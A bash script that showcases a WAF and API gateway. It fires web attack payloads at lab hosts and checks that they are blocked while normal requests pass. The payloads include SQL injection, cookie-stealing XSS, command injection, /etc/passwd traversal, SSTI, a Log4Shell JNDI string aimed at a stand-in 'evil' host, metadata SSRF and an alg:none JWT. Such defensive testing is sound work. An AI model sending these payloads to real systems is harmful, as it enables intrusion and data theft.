#!/usr/bin/env bash
#
# F5 NGINX WAF + API Gateway — three-tier capability showcase.
# Default LAN publish: 192.168.1.177:8081 / :8082 / :8083
#
set -uo pipefail

HOST="${DEMO_HOST:-192.168.1.177}"
ORIGIN="${ORIGIN:-http://${HOST}:8081}"
WAF="${WAF:-http://${HOST}:8082}"
APIGW="${APIGW:-http://${HOST}:8083}"

B=$'\e[1m'; D=$'\e[2m'; R=$'\e[31m'; G=$'\e[32m'; Y=$'\e[33m'; M=$'\e[35m'; X=$'\e[0m'
pass=0; fail=0
HDRS="/tmp/f5-hdrs.$$"

hr(){ printf '%s%s%s\n' "$D" "----------------------------------------------------------------------------" "$X"; }
cat_hdr(){ printf '\n%s%s### %s%s\n' "$B" "$M" "$1" "$X"; }
lower(){ printf '%s' "$1" | tr '[:upper:]' '[:lower:]'; }

wait_ready(){
  local url="$1" name="$2" i=0
  printf '  waiting for %s … ' "$name"
  while (( i < 40 )); do
    code=$(curl -s -o /dev/null -w '%{http_code}' -m 3 "$url" 2>/dev/null || echo 000)
    if [[ "$code" != "000" && "$code" != "" ]]; then
      printf '%sready%s (%s)\n' "$G" "$X" "$code"; return 0
    fi
    sleep 1; i=$((i+1))
  done
  printf '%sTIMEOUT%s\n' "$R" "$X"; return 1
}

atk(){
  local label="$1" path="$2" sig="$3" ob oc wcode acode ablock wok aok
  ob=$(curl -s -m 10 "${ORIGIN}${path}" 2>/dev/null)
  if echo "$ob" | grep -qiE "$sig"; then oc="${Y}exploited${X}"; else oc="${D}no-leak${X} "; fi
  wcode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "${WAF}${path}" 2>/dev/null)
  acode=$(curl -s -D "$HDRS" -o /dev/null -w '%{http_code}' -m 10 \
    -H 'x-f5-demo-mode: lab' "${APIGW}${path}" 2>/dev/null)
  ablock=$(grep -i '^x-f5-block:' "$HDRS" 2>/dev/null | awk '{print $2}' | tr -d '\r')
  wok=fail; aok=fail
  if [[ "$wcode" == "403" ]]; then wok=ok; pass=$((pass+1)); else fail=$((fail+1)); fi
  if [[ "$acode" == "403" && "$(lower "$ablock")" == "true" ]]; then aok=ok; pass=$((pass+1)); else fail=$((fail+1)); fi
  printf '  %-26s origin %b  CRS %s%s%s  APIGW %s%s%s\n' \
    "$label" "$oc" \
    "$([[ $wok == ok ]] && echo "$G" || echo "$R")" "$wcode" "$X" \
    "$([[ $aok == ok ]] && echo "$G" || echo "$R")" "$acode" "$X"
}

atkw(){
  local label="$1" path="$2"; shift 2
  local wcode acode ablock
  wcode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$@" "${WAF}${path}" 2>/dev/null)
  acode=$(curl -s -D "$HDRS" -o /dev/null -w '%{http_code}' -m 10 \
    -H 'x-f5-demo-mode: lab' "$@" "${APIGW}${path}" 2>/dev/null)
  ablock=$(grep -i '^x-f5-block:' "$HDRS" 2>/dev/null | awk '{print $2}' | tr -d '\r')
  if [[ "$wcode" == "403" ]]; then pass=$((pass+1)); else fail=$((fail+1)); fi
  if [[ "$acode" == "403" && "$(lower "$ablock")" == "true" ]]; then pass=$((pass+1)); else fail=$((fail+1)); fi
  printf '  %-26s CRS %s%s%s  APIGW %s%s%s\n' "$label" \
    "$([[ $wcode == 403 ]] && echo "$G" || echo "$R")" "$wcode" "$X" \
    "$([[ $acode == 403 && $(lower "$ablock") == true ]] && echo "$G" || echo "$R")" "$acode" "$X"
}

feat(){
  local label="$1" expect="$2" path="$3"; shift 3
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$@" "${APIGW}${path}" 2>/dev/null)
  if [[ "$code" == "$expect" ]]; then
    printf '  %-36s APIGW %s%s OK%s\n' "$label" "$G" "$code" "$X"; pass=$((pass+1))
  else
    printf '  %-36s APIGW %s%s (want %s)%s\n' "$label" "$R" "$code" "$expect" "$X"; fail=$((fail+1))
  fi
}

legit(){
  local label="$1" path="$2" wcode acode
  wcode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "${WAF}${path}" 2>/dev/null)
  acode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 -H 'x-f5-demo-mode: lab' "${APIGW}${path}" 2>/dev/null)
  if [[ "$wcode" == "200" ]]; then pass=$((pass+1)); else fail=$((fail+1)); fi
  if [[ "$acode" == "200" ]]; then pass=$((pass+1)); else fail=$((fail+1)); fi
  printf '  %-26s CRS %s%s%s  APIGW %s%s%s\n' "$label" \
    "$([[ $wcode == 200 ]] && echo "$G" || echo "$R")" "$wcode" "$X" \
    "$([[ $acode == 200 ]] && echo "$G" || echo "$R")" "$acode" "$X"
}

trap 'rm -f "$HDRS"' EXIT

printf '\n%s========================================================================%s\n' "$B" "$X"
printf '%s  F5 NGINX WAF + API Gateway — capability showcase%s\n' "$B" "$X"
printf '    origin (open):     %s\n' "$ORIGIN"
printf '    CRS WAF:           %s\n' "$WAF"
printf '    F5 API GW+WAF:     %s\n' "$APIGW"
printf '%s========================================================================%s\n' "$B" "$X"

cat_hdr "Readiness"
wait_ready "$ORIGIN/healthz" "origin" || true
wait_ready "$WAF/" "CRS WAF" || true
wait_ready "$APIGW/healthz" "API GW" || true

cat_hdr "Injection & OWASP Top 10 (Apigee-parity paths)"
atk "SQL injection"          "/products?cat=deposit%27%20OR%20%271%27=%271" 'LEAKED|SSN|injection succeeded|users.admin'
atk "Reflected XSS"          "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E" '<script>alert'
atk "Command injection"      "/ping?host=127.0.0.1;whoami" 'root|uid=0'
atk "Path traversal (LFI)"   "/statement?file=../../../../etc/passwd" 'root:.*:0:0'
feat "SSTI blocked at API GW"        "403" "/render?tpl=%7B%7B7*7%7D%7D" -H 'x-f5-demo-mode: lab'

cat_hdr "High-profile threat campaigns"
atk "Log4Shell (JNDI)"       "/lookup?user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fx%7D" 'log4shell|jndi|RCE'
atk "SSRF (cloud metadata)"  "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F" 'ssrf|ASIA|STOLEN'

cat_hdr "Bot & protocol"
atkw "Scanner UA: sqlmap"     "/" -A 'sqlmap/1.5.2'
atkw "Disallowed method: PUT" "/" -X PUT

cat_hdr "API Gateway features (:8083)"
feat "API key required (no key)"     "401" "/products?cat=deposit"
feat "API key accepted"              "200" "/products?cat=deposit" -H "x-api-key: demo-f5-key"
feat "JWT alg:none rejected"         "403" "/api/me" \
  -H 'x-f5-demo-mode: lab' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.'
feat "Lab page"                      "200" "/lab"
feat "Features page"                 "200" "/features"

cat_hdr "Legitimate traffic (must still pass)"
legit "Home page"            "/"
legit "Product lookup"       "/products?cat=deposit"
legit "Product search"       "/search?q=laptop"

hr
total=$((pass+fail))
printf '\n%s  Capability scorecard: %s/%s enforced correctly%s\n' "$B" "$pass" "$total" "$X"
printf '  Lab:      %s/lab\n' "$APIGW"
printf '  Features: %s/features\n' "$APIGW"
printf '  Compare:  https://apigee-lab.fictionally.org/lab\n'
if [[ "$fail" -eq 0 ]]; then
  printf '  %sPASS%s — attacks blocked where expected; legitimate traffic allowed.\n\n' "$G" "$X"; exit 0
else
  printf '  %sFAIL%s — %s check(s) did not behave as expected.\n\n' "$R" "$X" "$fail"; exit 1
fi
